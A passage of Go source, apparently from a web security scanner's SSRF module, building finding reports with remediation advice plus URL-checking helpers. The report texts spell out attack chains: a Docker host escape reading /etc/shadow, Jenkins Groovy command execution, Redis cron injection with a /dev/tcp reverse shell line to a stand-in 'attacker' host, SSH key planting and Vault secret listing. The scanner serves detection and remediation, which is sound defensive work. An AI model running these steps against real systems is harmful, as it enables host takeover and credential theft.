			"  2. Start container: POST /containers/{id}/start\n" +
			"  3. Execute as root with full host access:\n" +
			`     POST /containers/{id}/exec {"Cmd":["chroot","/host","sh","-c","id && cat /etc/shadow"],"AttachStdout":true}` + "\n" +
			"This achieves root-level code execution on the Docker host.",
		CWE:         "CWE-918",
		CVSS:        10.0,
		CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
		Confidence:  modules.Confirmed,
		Remediation: "Never expose the Docker daemon on a TCP socket without TLS mutual authentication; use Unix socket only; enable Docker authorization plugins; isolate the Docker API behind a firewall",
		Tags:        []string{"ssrf", "docker", "rce", "container-escape", "lateral-movement"},
	}
}

func chainJenkins(probeURL, fromURL, paramName string) *modules.Finding {
	return &modules.Finding{
		Module:      "ssrf",
		Severity:    modules.Critical,
		URL:         fromURL,
		Param:       paramName,
		Payload:     probeURL,
		Evidence:    "Jenkins API at 127.0.0.1:8080 confirmed — Script Console likely accessible",
		Detail:      "SSRF → Jenkins Groovy RCE chain: Jenkins is accessible on the internal network. If the Script Console is enabled (common on unprotected instances), arbitrary OS commands can be executed:\n" +
			"  POST http://127.0.0.1:8080/script\n" +
			`  Body: script=["id"].execute().text` + "\n" +
			"  or: script=def+p='id'.execute()%3breturn+p.text\n" +
			"Even without the Script Console, the Jenkins API exposes job configurations, credentials, and build secrets.",
		CWE:         "CWE-918",
		CVSS:        9.8,
		CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
		Confidence:  modules.Likely,
		Remediation: "Require authentication for all Jenkins endpoints; disable Script Console in production; restrict Jenkins to an internal network; rotate all credentials stored in Jenkins",
		Tags:        []string{"ssrf", "jenkins", "rce", "groovy", "ci-cd"},
	}
}

func chainRedisRCE(probeURL, fromURL, paramName string) *modules.Finding {
	return &modules.Finding{
		Module:      "ssrf",
		Severity:    modules.Critical,
		URL:         fromURL,
		Param:       paramName,
		Payload:     probeURL,
		Evidence:    "Redis instance at 127.0.0.1:6379 responding without authentication",
		Detail:      "SSRF → Redis RCE chain: unauthenticated Redis is accessible. Via gopher:// SSRF or direct HTTP injection, attackers can achieve RCE through cron job injection:\n" +
			"  1. CONFIG SET dir /var/spool/cron/crontabs\n" +
			"  2. CONFIG SET dbfilename root\n" +
			"  3. SET malicious_key \"\\n\\n* * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\\n\\n\"\n" +
			"  4. BGSAVE\n" +
			"Alternatively, inject a webshell via CONFIG SET dir + BGSAVE to the web root.\n" +
			"Requires: cron service running, write permissions to /var/spool/cron or web root.",
		CWE:         "CWE-918",
		CVSS:        9.0,
		CVSSVector:  "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H",
		Confidence:  modules.Likely,
		Remediation: "Set requirepass in redis.conf; bind Redis to 127.0.0.1 only; disable CONFIG SET at runtime with rename-command CONFIG; block Redis port at the firewall",
		Tags:        []string{"ssrf", "redis", "rce", "stored-credential"},
	}
}

func chainRedisGopherRCE(probeURL, fromURL, paramName string) *modules.Finding {
	return &modules.Finding{
		Module:      "ssrf",
		Severity:    modules.Critical,
		URL:         fromURL,
		Param:       paramName,
		Payload:     probeURL,
		Evidence:    "Redis PONG confirmed via gopher:// — server supports gopher:// scheme SSRF",
		Detail:      "SSRF via gopher:// → Redis RCE chain: the gopher:// scheme is supported, which allows sending raw TCP payloads to internal services. Redis responded to a PING via gopher://. An attacker can craft gopher:// payloads to:\n" +
			"  1. Inject cron jobs for reverse shell\n" +
			"  2. Write SSH authorized_keys: CONFIG SET dir /root/.ssh; CONFIG SET dbfilename authorized_keys; SET key 'ssh-rsa AAAA...'\n" +
			"  3. Write webshell to web root\n" +
			"gopher:// enables multi-command Redis injection in a single HTTP request.",
		CWE:         "CWE-918",
		CVSS:        9.8,
		CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
		Confidence:  modules.Confirmed,
		Remediation: "Block gopher:// scheme in URL validation; set requirepass; bind Redis to 127.0.0.1 only; disable CONFIG SET",
		Tags:        []string{"ssrf", "redis", "gopher", "rce", "protocol-smuggling"},
	}
}

func chainVault(probeURL, fromURL, paramName string) *modules.Finding {
	return &modules.Finding{
		Module:      "ssrf",
		Severity:    modules.Critical,
		URL:         fromURL,
		Param:       paramName,
		Payload:     probeURL,
		Evidence:    "HashiCorp Vault health endpoint at 127.0.0.1:8200 confirmed",
		Detail:      "SSRF → HashiCorp Vault secret extraction chain: Vault is accessible on the internal network. If the Vault instance is unsealed and running without ACL policies, an attacker can:\n" +
			"  1. List secret engines: GET /v1/sys/mounts\n" +
			"  2. List secrets: GET /v1/secret/metadata/?list=true\n" +
			"  3. Read secrets: GET /v1/secret/data/{path}\n" +
			"  4. List identities and roles: GET /v1/identity/entity/id?list=true\n" +
			"Even with ACLs, the health endpoint leaks initialization/seal status. If a root token or high-privilege token is discoverable, full secret extraction is possible.",
		CWE:         "CWE-918",
		CVSS:        9.1,
		CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N",
		Confidence:  modules.Likely,
		Remediation: "Restrict Vault API access to authorized internal clients only; apply strict ACL policies; do not expose Vault health endpoint without authentication; rotate any secrets that may have been exposed",
		Tags:        []string{"ssrf", "vault", "secret-theft", "lateral-movement"},
	}
}

// ============================================================
// Helpers
// ============================================================

func isURLParam(name string) bool {
	lower := strings.ToLower(name)
	for _, up := range urlParamNames {
		if lower == strings.ToLower(up) || strings.Contains(lower, strings.ToLower(up)) {
			return true
		}
	}
	return false
}

func looksLikeURL(v string) bool {
	return strings.HasPrefix(v, "http://") || strings.HasPrefix(v, "https://") ||
		strings.HasPrefix(v, "//") || strings.HasPrefix(v, "/")
}

func isIMDSURL(u string) bool {
	return strings.Contains(u, "169.254.169.254") ||
		strings.Contains(u, "metadata.google.internal") ||
		strings.Contains(u, "100.100.100.200") ||
		strings.Contains(u, "metadata.tencentyun.com") ||
		strings.Contains(u, "169.254.170.2")
}

func isLocalhostURL(u string) bool {
	lower := strings.ToLower(u)
	return strings.Contains(lower, "127.0.0.1") ||
		strings.Contains(lower, "localhost") ||
		strings.Contains(lower, "0.0.0.0") ||
		strings.Contains(lower, "[::1]") ||
		strings.Contains(lower, "0x7f000001") ||
		strings.Contains(lower, "2130706433") ||
		strings.Contains(lower, "0177.0.0") ||
		strings.Contains(lower, "127.1")
}

func paramURL(p ssrfParam) string {
	if p.form != nil {
		return p.form.Action
	}
	if p.jsonParam != nil {
		return p.jsonParam.Endpoint
	}
	return p.pageURL
}

func paramKey(p ssrfParam) string {
	return fmt.Sprintf("%s|%s", paramURL(p), p.name)
}

func tagsForProbe(pr probe) []string {
	tags := []string{"ssrf"}
	url := strings.ToLower(pr.url)
	switch {
	case strings.Contains(url, "169.254.169.254") || strings.Contains(url, "metadata"):
		tags = append(tags, "cloud-metadata", "lateral-movement")
	case strings.Contains(url, "gopher://"):
		tags = append(tags, "protocol-smuggling", "gopher")
	case strings.Contains(url, "file://"):
		tags = append(tags, "file-read", "lfi")
	case strings.Contains(url, "127.0.0.1") || strings.Contains(url, "localhost"):
		tags = append(tags, "internal-service")
	}
	return tags
}

// setAtPath sets a value deep inside a nested JSON-decoded map following path.
func setAtPath(obj map[string]interface{}, path []string, value string) {
	if len(path) == 0 {
		return
	}
	if len(path) == 1 {
		obj[path[0]] = value
		return
	}
	sub, ok := obj[path[0]].(map[string]interface{})
	if !ok {
		sub = make(map[string]interface{})
		obj[path[0]] = sub
	}
	setAtPath(sub, path[1:], value)
}

// deepCloneJSON performs a deep clone of a map[string]interface{} via JSON round-trip.
func deepCloneJSON(m map[string]interface{}) (map[string]interface{}, error) {
	b, err := json.Marshal(m)
	if err != nil {
		return nil, err
	}
	var clone map[string]interface{}
	if err := json.Unmarshal(b, &clone); err != nil {
		return nil, err
	}
	return clone, nil
}

// redactSecret removes the SecretAccessKey value from AWS credential JSON for safe logging.
func redactSecret(s string) string {
	lines := strings.Split(s, "\n")
	for i, line := range lines {
		if strings.Contains(line, "SecretAccessKey") {
			lines[i] = `  "SecretAccessKey": "[REDACTED]",`
		}
	}
	return strings.Join(lines, "\n")
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "…"
}
